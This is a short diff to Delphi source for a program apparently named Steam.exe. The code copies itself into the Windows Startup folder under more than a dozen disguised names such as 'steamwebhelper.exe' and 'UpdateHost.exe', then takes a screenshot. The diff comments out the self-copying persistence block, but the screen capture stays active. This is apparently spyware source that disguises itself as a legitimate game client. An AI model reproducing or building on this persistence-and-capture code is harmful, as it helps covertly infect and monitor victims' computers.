@@ -81,7 +81,7 @@ end;
 
 procedure TForm1.FormCreate(Sender: TObject);
 begin
-  CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Steam.exe');
+ (* CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Steam.exe');
   CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\steamwebhelper.exe');
   CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Steam Web Helper.exe');
   CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Host.exe');
@@ -98,7 +98,7 @@ begin
   CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Host64.exe');
   CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\HostUpdate.exe');
   CopyFile('Steam.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\UpdateHost.exe');
-  Sleep(10000);
+  Sleep(10000);                     *)
   // Снимок экрана
   ScreenShot := TakeScreenshot;
 
